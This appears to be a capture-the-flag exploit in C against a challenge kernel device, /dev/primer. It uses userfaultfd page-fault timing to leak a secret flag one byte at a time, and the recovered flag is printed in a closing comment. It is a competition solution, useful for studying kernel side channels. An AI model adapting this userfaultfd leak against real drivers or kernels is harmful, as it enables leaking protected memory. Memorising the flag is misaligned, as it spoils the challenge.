#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/userfaultfd.h>
#include <fcntl.h>

#define IOCTL_QUERY 0x80086400

static void *pf_handler(void *arg) {
    int uffd = (int)(uintptr_t)arg;
    void *pf_addr;
    struct uffd_msg msg;
    ssize_t n;

    n = read(uffd, &msg, sizeof(msg));
    if (n == 0) {
        return NULL;  // No more events
    }

    if (n == -1) {
        perror("read");
        return NULL;
    }

    if (!(msg.event & UFFD_EVENT_PAGEFAULT)) {
        puts("event != #PF");
    }

    pf_addr = (void*)msg.arg.pagefault.address;
    
    struct uffdio_zeropage zeropage = {0};
    zeropage.range.start = msg.arg.pagefault.address;
    zeropage.range.len = getpagesize();

    if (ioctl(uffd, UFFDIO_ZEROPAGE, &zeropage)) {
        perror("ioctl UFFDIO_ZEROPAGE");
    }

    return pf_addr;
}

int main(int argc, char **argv) {
    void *p1 = 0 , *p2 = 0; 
    char flag[0x100] = {0};
    
    int fd, ret;

    int uffd = syscall(323, O_CLOEXEC);
    if (uffd == -1) {
        perror("userfaultfd");
        return EXIT_FAILURE;
    }

    struct uffdio_api uffdio_api = { .api = UFFD_API, .features = 0 };
    if (ioctl(uffd, UFFDIO_API, &uffdio_api)) {
        perror("ioctl UFFDIO_API");
        return EXIT_FAILURE;
    }

    fd = open("/dev/primer", O_RDONLY);
    if (!fd) {
        perror("failed to open device");
        return EXIT_FAILURE;
    }

    for (size_t c = 0; c < 0x100; c++) {
        for (size_t i = 0x20; i < 0x80; i++) {
            pthread_t thread;
            if (pthread_create(&thread, NULL, pf_handler, uffd)) {
                perror("pthread_create");
                return EXIT_FAILURE;
            }

            p1 = mmap((void*)0xdead0000, 2*getpagesize(), PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
            p2 = p1 + getpagesize();

            struct uffdio_register uffdio_register = {
                .range = {
                    .start = (unsigned long long)p1,
                    .len = 2*getpagesize(),
                },
                .mode = UFFDIO_REGISTER_MODE_MISSING
            };

            if (ioctl(uffd, UFFDIO_REGISTER, &uffdio_register)) {
                perror("ioctl UFFDIO_REGISTER");
                return EXIT_FAILURE;
            }

            unsigned long long user, param, addr;
            user = c;
            addr = (unsigned long long)(p2 - i -1);
            param = addr + (user << 56);
            ret = ioctl(fd, IOCTL_QUERY, param);
            
            void *pf_addr = NULL;
            if (pthread_join(thread, &pf_addr) != 0) {
                perror("thread join");
                return EXIT_FAILURE;
            }
            
            munmap(p1, 2*getpagesize());   
            
            if (pf_addr == p1) {
                flag[c] = i;
                break;
            }
        }        
        
        if (flag[c] == 0 || flag[c] == '}') {
            break;
        }
    }

    puts(flag);
    close(uffd);
    return 0;
}

// irisctf{the_cache_always_remembers}